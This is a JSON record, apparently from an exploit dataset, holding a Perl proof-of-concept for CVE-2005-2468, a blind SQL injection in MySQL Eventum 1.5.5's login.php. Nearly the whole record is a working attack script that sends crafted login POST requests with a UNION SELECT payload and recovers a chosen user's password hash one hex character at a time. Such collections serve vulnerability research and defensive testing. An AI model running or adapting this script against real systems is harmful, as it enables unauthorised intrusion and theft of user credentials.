{
  "id": "1134",
  "title": "MySQL Eventum 1.5.5 - &#039;login.php&#039; SQL Injection",
  "cve": "CVE-2005-2468",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\nuse IO::Socket;\r\nuse strict;\r\n\r\nprint \"#################################\\n\";\r\nprint \"#  MySQL Eventum <= v1.5.5 SQL Injection PoC  #\\n\";\r\nprint \"#   James Bercegay // gulftech.org // 7-28-05      #\\n\";\r\nprint \"#################################\\n\";\r\n\r\nmy $host = 'localhost';\r\nmy $path = '/eventum/login.php';\r\nmy $user = '2';\r\nmy $port = 80;\r\nmy $pass = '';\r\n\r\nmy @char = ('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');\r\n\r\nprint \"[*] Trying $host\\n\";\r\n\r\nOUTER: for ( my $i = 1; $i < 33; $i++ ) \r\n{\r\nINNER: for ( my $j=0; $j < 16; $j++ )\r\n{\r\nmy $used = $char[$j];\r\nmy $sock = IO::Socket::INET->new( PeerAddr => $host, PeerPort => $port, Proto => 'tcp' ) || die \"[!] Unable to connect to $host\\n\";\r\n\r\nmy $post = \"cat=login&url=&email=%27+UNION+SELECT+%273355d92c04a3332339b767f9278405ff%27+FROM+eventum_user+WHERE+usr_id=$user+AND+MID(usr_password,$i,1)='$used'%2F*&passwd=dance&Submit=Login\";\r\nmy $send = \"POST $path HTTP/1.1\\r\\n\";\r\n$send .= \"Host: $host\\r\\n\";\r\n$send .= \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6\\r\\n\";\r\n$send .= \"Connection: Keep-Alive\\r\\n\";\r\n$send .= \"Content-type: application/x-www-form-urlencoded\\r\\n\"; \r\n$send .= \"Content-length: \".length($post).\"\\r\\n\\r\\n\";\r\n$send .= \"$post\\r\\n\\r\\n\";\r\n\r\nprint $sock $send;\r\n\r\nwhile ( my $line = <$sock> )\r\n{\r\nif ( $line =~ /(.*)err=7(.*)/is )\r\n{\r\n$pass .= $used;\r\nprint \"[+] Char $i is $used\\n\";\r\nlast INNER;\r\n} \r\n#/if\r\n}\r\n#/while\r\n\r\nclose($sock);\r\n}\r\n#/for INNER\r\n\r\nif ( length($pass) < 1 ) \r\n{\r\nprint \"[!] Host not vulnerable!\";\r\nexit;\r\n}\r\n}\r\n#/for OUTER\r\n\r\nprint \"[+] Pass hash is $pass\\n\";\r\nexit;\r\n\r\n# milw0rm.com [2005-08-05]",
  "url": "https://www.exploit-db.com/exploits/1134"
}